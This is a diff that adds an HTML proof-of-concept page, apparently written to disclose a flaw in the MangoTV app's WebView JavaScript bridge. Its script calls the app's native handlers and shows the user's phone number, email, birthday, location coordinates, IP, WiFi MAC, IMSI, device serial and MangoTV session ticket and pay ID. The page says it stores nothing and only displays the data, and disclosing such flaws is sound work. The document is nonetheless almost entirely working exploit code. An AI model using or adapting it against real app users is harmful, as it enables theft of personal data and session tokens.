@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        .container {
+            width: 100%;
+            padding: 15px;
+        }
+
+        @media screen and (min-width: 700px) {
+            .container {
+                width: 70%;
+                margin: auto;
+            }
+        }
+    </style>
+    <title>Malicious Page</title>
+</head>
+
+
+<body>
+    <h1>Malicious Page</h1>
+
+    <p>!!! This is just a demo page, NO Sensitive Data will be stored!!!</p>
+
+    <p>An attacker can steal sensitive information such as:</p>
+
+    <p style="font-size: 15px;" id="Location">your Location: </p>
+
+    <p style="font-size: 15px;" id="PhoneNumber">your PhoneNumber: </p>
+
+    <p style="font-size: 15px;" id="Gender">your Gender: </p>
+    <p style="font-size: 15px;" id="BirthDay">your BirthDay: </p>
+    <p style="font-size: 15px;" id="Email">your Email: </p>
+    <p style="font-size: 15px;" id="ProvinceAndCity">your Province and City: </p>
+
+    <p style="font-size: 15px;" id="NickName">your NickName: </p>
+    <p style="font-size: 15px;" id="PersonalSignature">your PersonalSignature: </p>
+
+    <p style="font-size: 15px;">your Avatar: </p>
+    <div class="image-with-text">
+        <img id="Avatar" src="https://avatar.hitv.com/4410843ee89e4066acf180ceeb917882/EMV959wxJwcd.jpg" alt=""
+            width="50%" height="auto">
+    </div>
+
+    <p style="font-size: 15px;" id="IP">your IP: </p>
+    <p style="font-size: 15px;" id="WifiMac">your WifiMac: </p>
+    <p style="font-size: 15px;" id="DeviceName">your DeviceName: </p>
+    <p style="font-size: 15px;" id="DeviceSn">your DeviceSN: </p>
+    <p style="font-size: 15px;" id="Imsi">your Device IMSI: </p>
+    <!-- <p style="font-size: 15px;" id="IDFA">your Device IDFA: </p> -->
+    <p style="font-size: 15px;" id="UsedStorage">your Device Used Storage: </p>   
+    <p style="font-size: 15px;" id="TotalStorage">your Device Total Storage: </p>
+
+    <p style="font-size: 15px;" id="UUID">your MangoTV UUID: </p>
+    <!-- <p style="font-size: 15px;" id="VIPFingerprint">your MangoTV VIP Fingerprint: </p> -->
+    <p style="font-size: 15px;" id="Ticket">your MangoTV Ticket: </p>
+    <p style="font-size: 15px;" id="Paid">your MangoTV PayID: </p>
+    <p style="font-size: 15px;" id="GUID">your MangoTV GUID: </p>
+
+
+    <script>
+
+        function setupWebViewJavascriptBridge(callback) {
+            if (window.WebViewJavascriptBridge) { return callback(WebViewJavascriptBridge); }
+            if (window.WVJBCallbacks) { return window.WVJBCallbacks.push(callback); }
+            window.WVJBCallbacks = [callback];
+            var WVJBIframe = document.createElement('iframe');
+            WVJBIframe.style.display = 'none';
+            WVJBIframe.src = 'https://__bridge_loaded__';
+            document.documentElement.appendChild(WVJBIframe);
+            setTimeout(function () { document.documentElement.removeChild(WVJBIframe) }, 0)
+        }
+
+        function convertToGB(bytes) {
+            var sizeInBytes = parseInt(bytes);
+            var sizeInGB = sizeInBytes / (1024 * 1024 * 1024);
+            return sizeInGB.toFixed(2) + "GB";
+        }
+
+        setupWebViewJavascriptBridge(function (bridge) {
+            bridge.callHandler('getUserInfo', {}, function (response) {
+                var json = JSON.parse(response.data);
+
+                document.getElementById("PhoneNumber").innerText = "your PhoneNumber: " + json.relate_mobile;
+
+                document.getElementById("NickName").innerText = "your NickName: " + json.nickname;
+
+                document.getElementById("PersonalSignature").innerText = "your PersonalSignature: " + json.introduction;
+
+                document.getElementById("Avatar").src = json.avatar.xl.replace("\/", "/");
+
+                document.getElementById("BirthDay").innerText = "your BirthDay: " + json.birthday;
+
+                document.getElementById("Email").innerText = "your Email: " + json.email;
+
+                document.getElementById("Gender").innerText = "your Gender: " + (json.sex === 1 ? "male" : (json.sex === 2 ? "female" : "undisclosed"));
+
+                document.getElementById("UUID").innerText = "your MangoTV UUID: " + json.uuid;
+
+                // document.getElementById("VIPFingerprint").innerText = "your MangoTV VIP Fingerprint: " + json.vipinfo.ext.fingerprint;
+
+                document.getElementById("ProvinceAndCity").innerText = "your Province and City: " + json.province + " " + json.city;
+            });
+
+            bridge.callHandler('getDeviceInfoForLoan', {}, function (response) {
+                var json = JSON.parse(response.data);
+
+                document.getElementById("Location").innerText = "your Location: " + json.app_location.address + " (" + json.app_location.lat + ", " + json.app_location.lon + ")";
+
+                document.getElementById("IP").innerText = "your IP: " + json.device_info_all.trueIp;
+                document.getElementById("WifiMac").innerText = "your WifiMac: " + json.device_info_all.WifiMac;
+                document.getElementById("DeviceName").innerText = "your DeviceName: " + json.device_info_all.deviceName;
+                document.getElementById("DeviceSn").innerText = "your DeviceSN: " + json.device_info_all.deviceSn;
+                document.getElementById("Imsi").innerText = "your Device IMSI: " + json.device_info_all.imsi;
+
+                document.getElementById("UsedStorage").innerText = "your Device Used Storage: " + convertToGB(json.device_info_all.usedStorage);
+                document.getElementById("TotalStorage").innerText = "your Device Total Storage: " + convertToGB(json.device_info_all.totalStorage);
+            });
+
+            bridge.callHandler('getDeviceInfo', {}, function (response) {
+                var json = JSON.parse(response.data);
+
+                document.getElementById("Ticket").innerText = "your MangoTV Ticket: " + json.ticket;
+                document.getElementById("Paid").innerText = "your MangoTV PayID: " + json.paid;
+                document.getElementById("GUID").innerText = "your MangoTV GUID: " + json.guid;
+
+                // document.getElementById("IDFA").innerText = "your Device IDFA: " + json.idfa;
+
+            });
+
+        })
+
+    </script>
+
+</body>
+
+</html>
